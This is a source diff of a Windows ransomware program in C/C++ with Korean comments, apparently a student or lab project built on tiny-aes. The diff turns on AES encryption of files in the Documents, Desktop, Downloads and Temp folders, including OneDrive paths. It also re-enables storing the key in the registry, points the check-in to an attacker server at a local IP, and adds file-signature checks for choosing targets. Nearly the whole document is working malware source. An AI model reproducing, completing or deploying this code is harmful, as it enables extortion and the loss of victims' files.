@@ -8,6 +8,7 @@
 #include <time.h>
 #include <sys/types.h>
 #include "Windows-setup.h"
+#include "Filetype-check.h"
 
 // 코드 베이스는 tiny-aes 깃허브의 test 코드
 // 헤더에서 AES128 사용하도록 설정해놓음
@@ -45,26 +46,6 @@ char* targetFolderList[TARGET_NUM];
 
 char cryptoKey[AES_KEYLEN];
 
-int extension_cnt[EXTENSION_SIZE];
-
-enum Extension {
-	MP3, MP4, PNG, JPG, GIF, TXT, DOCX, PPTX, XLSX, PDF
-};
-
-char extensions[EXTENSION_SIZE][EXTENSION_SIZE] = {
-	"mp3", "mp4", "png", "jpg", "gif", "txt", "docx", "pptx", "xlsx", "pdf"
-};
-
-enum Extension ext;
-
-uint8_t docx_header[8] = { 0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x06, 0x00 };
-uint8_t docx_footer[4] = { 0x50, 0x4B, 0x05, 0x06 };
-uint8_t jpg_header1[4] = { 0xFF, 0xD8, 0xFF, 0xE0 };
-uint8_t jpg_header2[4] = { 0xFF, 0xD8, 0xFF, 0xE8 };
-uint8_t jpg_footer[2] = { 0xFF, 0xD9 };
-uint8_t png_header[8] = { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A };
-uint8_t png_footer[8] = { 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82 };
-
 typedef struct TargetFolders {
 	vector<string> documentFolderFiles;
 	vector<string> documentFolderFiles_onedrive;
@@ -83,8 +64,6 @@ void makeFolderPath();            // 타겟으로 지정된 폴더들 경로 생성
 int readTargetFolder(int, char*, char*);   // 타겟으로 지정된 폴더들 탐색하기
 int registerKeyToRegistry();      // 암호화 키 레지스트리에 등록
 int encryptFile(const char* filepath);	// 파일 내용 읽어서 암호화
-const char* getFileType(const char* filepath);	// 파일 확장자 리턴
-void countExtensions();						// 파일 확장자 개수 카운트
 
 int k = 0;
 
@@ -94,8 +73,10 @@ struct AES_ctx ctx;
 
 int main(void)
 {
+	// 현재 프로그램을 실행하는 OS의 버전 불러오기
 	strcpy(osVersion, GetOSName());
 
+	// 클라이언트에서 랜섬웨어 실행 시 공격자에게 알리기
 	if (!notifyToServer()) {
 		fprintf(stderr, "notifyToServer error\n");
 		return 0;
@@ -103,15 +84,12 @@ int main(void)
 
 	// 타겟 폴더 탐색에 필요한 경로 생성
 	makeFolderPath();
-	/*
+
+	// 전송 받은 암호화 키를 레지스트리에 등록
 	if (registerKeyToRegistry() == 0) {
 		fprintf(stderr, "Register key error\n");
 		return -1;
 	}
-	*/
-	for (int i = 0; i < AES_KEYLEN; i++)
-		printf("%02x ", cryptoKey[i] & 0xFF);
-	printf("\n");
 
 	WIN32_FIND_DATAA files;
 	HANDLE curFile;
@@ -123,72 +101,71 @@ int main(void)
 			return -1;
 		}
 	}
-
+	
 	// 구조체별 저장한 파일들 암호화
 	// document 폴더
 	vector<string>::iterator it;
 	if (targetFolders.documentFolderFiles.size()) {
 		for (it = targetFolders.documentFolderFiles.begin(); it != targetFolders.documentFolderFiles.end(); it++) {
-			printf("file : %s\n", it->c_str());
+			//printf("file : %s\n", it->c_str());
 			encryptFile(it->c_str());
 		}
 	}
 	// document 폴더 onedrive 인 경우
 	if (targetFolders.documentFolderFiles_onedrive.size()) {
 		for (it = targetFolders.documentFolderFiles_onedrive.begin(); it != targetFolders.documentFolderFiles_onedrive.end(); it++) {
-			printf("file : %s\n", it->c_str());
-			//encryptFile(it->c_str());
+			//printf("file : %s\n", it->c_str());
+			encryptFile(it->c_str());
 		}
 	}
 
 	// desktop 폴더
 	if (targetFolders.desktopFolderFiles.size()) {
 		for (it = targetFolders.desktopFolderFiles.begin(); it != targetFolders.desktopFolderFiles.end(); it++) {
-			printf("file : %s\n", it->c_str());
-			//encryptFile(it->c_str());
+			//printf("file : %s\n", it->c_str());
+			encryptFile(it->c_str());
 		}
 	}
 
 	// desktop 폴더 onedrive인 경우
 	if (targetFolders.desktopFolderFiles_onedrive.size()) {
 		for (it = targetFolders.desktopFolderFiles_onedrive.begin(); it != targetFolders.desktopFolderFiles_onedrive.end(); it++) {
-			printf("file : %s\n", it->c_str());
-			//encryptFile(it->c_str());
+			//printf("file : %s\n", it->c_str());
+			encryptFile(it->c_str());
 		}
 	}
 
 	// downloads 폴더
 	if (targetFolders.downloadsFolderFiles.size()) {
 		for (it = targetFolders.downloadsFolderFiles.begin(); it != targetFolders.downloadsFolderFiles.end(); it++) {
-			printf("file : %s\n", it->c_str());
-			//encryptFile(it->c_str());
+			//printf("file : %s\n", it->c_str());
+			encryptFile(it->c_str());
 		}
 	}
 
 	// downloads 폴더 onedrive인 경우
 	if (targetFolders.downloadsFolderFiles_onedrive.size()) {
 		for (it = targetFolders.downloadsFolderFiles_onedrive.begin(); it != targetFolders.downloadsFolderFiles_onedrive.end(); it++) {
-			printf("file : %s\n", it->c_str());
-			//encryptFile(it->c_str());
+			//printf("file : %s\n", it->c_str());
+			encryptFile(it->c_str());
 		}
 	}
 
 	// temp 폴더
 	if (targetFolders.tempFolderFiles.size()) {
 		for (it = targetFolders.tempFolderFiles.begin(); it != targetFolders.tempFolderFiles.end(); it++) {
-			printf("file : %s\n", it->c_str());
-			//encryptFile(it->c_str());
+			//printf("file : %s\n", it->c_str());
+			encryptFile(it->c_str());
 		}
 	}
 
 	// temp 폴더 onedrive인 경우
 	if (targetFolders.tempFolderFiles_onedrive.size()) {
 		for (it = targetFolders.tempFolderFiles_onedrive.begin(); it != targetFolders.tempFolderFiles_onedrive.end(); it++) {
-			printf("file : %s\n", it->c_str());
-			//encryptFile(it->c_str());
+			//printf("file : %s\n", it->c_str());
+			encryptFile(it->c_str());
 		}
 	}
-
 	return 0;
 }
 
@@ -215,7 +192,7 @@ int notifyToServer()
 	server_addr.sin_port = htons(PORT);
 
 	// 공격자의 IP 주소 별도 지정해야 함
-	server_addr.sin_addr.S_un.S_addr = inet_addr("192.168.1.58");
+	server_addr.sin_addr.S_un.S_addr = inet_addr("192.168.219.100");
 
 	if (connect(client_sock, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
 		fprintf(stderr, "connect error\n");
@@ -292,6 +269,7 @@ int registerKeyToRegistry()
 
 	printf("create subkey success!\n");
 
+	// 레지스트리 서브키(KEY)에 암호화키 등록
 	if (RegSetValueA(hKey, NULL, REG_SZ, cryptoKey, 0) != ERROR_SUCCESS) {
 		fprintf(stderr, "RegSetValue error\n");
 		return 0;
@@ -308,9 +286,12 @@ int readTargetFolder(int i, char* targetFolderName1, char* targetFolderName2)
 	WIN32_FIND_DATAA files, files1, files2;
 	HANDLE curFile1, curFile2, curFile;
 
+	// 윈도우10과 11 모두 onedrive 경로를 지원한다고 하여
+	// onedrive가 포함된 경로와 포함되지 않은 경로 모두 탐색
 	curFile1 = FindFirstFileA(targetFolderName1, &files1);
 	curFile2 = FindFirstFileA(targetFolderName2, &files2);
 
+	// 둘 중 탐색에 실패하지 않은 경로의 포인터 사용
 	if (curFile1 != INVALID_HANDLE_VALUE) {
 		curFile = curFile1;
 		files = files1;
@@ -320,6 +301,7 @@ int readTargetFolder(int i, char* targetFolderName1, char* targetFolderName2)
 		files = files2;
 	}
 
+	// 탐색한 디렉터리의 파일들 전부 읽기
 	while (FindNextFileA(curFile, &files)) {
 		char obj[FILE_MAXLEN];
 		memset(obj, 0x0, sizeof(obj));
@@ -331,6 +313,7 @@ int readTargetFolder(int i, char* targetFolderName1, char* targetFolderName2)
 		strcat(obj, files.cFileName);
 		//printf("\n%s\n", obj);
 
+		// 디렉터리가 아닌 파일들만 구조체에 저장
 		if (files.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) {
 			if (i == 0) {
 				// document folder files
@@ -361,10 +344,63 @@ int readTargetFolder(int i, char* targetFolderName1, char* targetFolderName2)
 	return 1;
 }
 
+int checkSignature(char *filepath)
+{
+	FILE* fp = NULL;
+	int size = 0;
+	char* read_buf = NULL;
+	fp = fopen(filepath, "rb"); //바이너리 읽기 모드
+	if (fp == NULL)
+	{
+		printf("open error\n");
+		return 1;
+	}
+
+	fseek(fp, 0, SEEK_END);
+	size = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+
+	int buf_size = size + 1;
+	if (buf_size < 8) buf_size = 8;
+	read_buf = (char*)calloc(buf_size, sizeof(char));
+	if (read_buf == NULL)
+	{
+		printf("calloc error\n");
+		return 1;
+	}
+	fread(read_buf, sizeof(char), size, fp);
+	fclose(fp);
+
+	//바이너리 파일 헤더 파악
+	binary2hex_print(filepath, read_buf);
+
+	fileheaderhexcheck();
+
+	const char* file_ext = GetFileExtenstion(filepath);
+	if (strcmp(filetype, "error") == 0 && strcmp(file_ext, "txt") == 0)
+	{
+		filetype = "txt";
+	}
+	free(read_buf);
+
+	// 타겟 파일인지 아닌지 확인
+	if (!strcmp(filetype, "mp4") || !strcmp(filetype, "png") || !strcmp(filetype, "pdf") || !strcmp(filetype, "txt")
+		|| !strcmp(filetype, "microsoft exe file"))
+		return 1;
+	else
+		return 0;
+}
+
 int encryptFile(const char* filepath)
 {
+	if (!checkSignature((char *)filepath)) {
+		return 0;
+	}
+
+	// 초기값 벡터
 	uint8_t iv[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
 
+	// iv 값을 랜덤하게 세팅
 	AES_init_ctx_iv(&ctx, (uint8_t*)cryptoKey, iv);
 
 	HANDLE read_fp, write_fp;
@@ -372,6 +408,7 @@ int encryptFile(const char* filepath)
 	bool brtv;
 	char buf[BUFFER_SIZE];
 
+	// 암호화 할 파일 포인터 리턴
 	read_fp = CreateFileA(filepath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	int i;
@@ -381,10 +418,11 @@ int encryptFile(const char* filepath)
 
 	char result[FILE_MAXLEN];
 	strcpy(result, filepath);
-
+	// 암호화 된 파일 저장할 파일명
 	strcpy(result + i, ".DEV");
 	printf("result : %s\n", result);
 	
+	// 암호화 된 파일 새로운 파일명에 쓰기
 	write_fp = CreateFileA(result, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (read_fp == INVALID_HANDLE_VALUE) {
@@ -404,71 +442,16 @@ int encryptFile(const char* filepath)
 		if (brtv && readn == 0)
 			break;
 
+		// 파일 내용 암호화
 		AES_CBC_encrypt_buffer(&ctx, (uint8_t*)buf, readn);
-
+		// 암호화 된 파일 내용을 target 파일에 쓰기
 		brtv = WriteFile(write_fp, buf, readn, &writen, NULL);
 
 		if (brtv && writen == 0)
 			break;
-
-		printf("encrypted : %s", buf);
 	}
 	
 	CloseHandle(read_fp);
-	//CloseHandle(write_fp);
+	CloseHandle(write_fp);
 	return 1;
-}
-
-const char* getFileType(const char* filepath)
-{
-	int i;
-	for (i = strlen(filepath) - 1; i >= 0; i--)
-		if (filepath[i] == '.')
-			break;
-	i++;
-	return &filepath[i];
-}
-
-void countExtensions()
-{
-	vector<string>::iterator it;
-	for (it = targetFolders.documentFolderFiles.begin(); it != targetFolders.documentFolderFiles.end(); it++) {
-		printf("name : %s\n", it->c_str());
-		for (int j = 0; j < EXTENSION_SIZE; j++)
-			if (!strcmp(getFileType(it->c_str()), extensions[j])) {
-				extension_cnt[j]++;
-				break;
-			}
-	}
-
-	for (it = targetFolders.desktopFolderFiles.begin(); it != targetFolders.desktopFolderFiles.end(); it++) {
-		printf("name : %s\n", it->c_str());
-		for (int j = 0; j < EXTENSION_SIZE; j++)
-			if (!strcmp(getFileType(it->c_str()), extensions[j])) {
-				extension_cnt[j]++;
-				break;
-			}
-	}
-
-	for (it = targetFolders.downloadsFolderFiles.begin(); it != targetFolders.downloadsFolderFiles.end(); it++) {
-		printf("name : %s\n", it->c_str());
-		for (int j = 0; j < EXTENSION_SIZE; j++)
-			if (!strcmp(getFileType(it->c_str()), extensions[j])) {
-				extension_cnt[j]++;
-				break;
-			}
-	}
-
-	for (it = targetFolders.tempFolderFiles.begin(); it != targetFolders.tempFolderFiles.end(); it++) {
-		printf("name : %s\n", it->c_str());
-		for (int j = 0; j < EXTENSION_SIZE; j++)
-			if (!strcmp(getFileType(it->c_str()), extensions[j])) {
-				extension_cnt[j]++;
-				break;
-			}
-	}
-
-	for (int i = 0; i < EXTENSION_SIZE; i++)
-		printf("%d ", extension_cnt[i]);
-	printf("\n");
 }
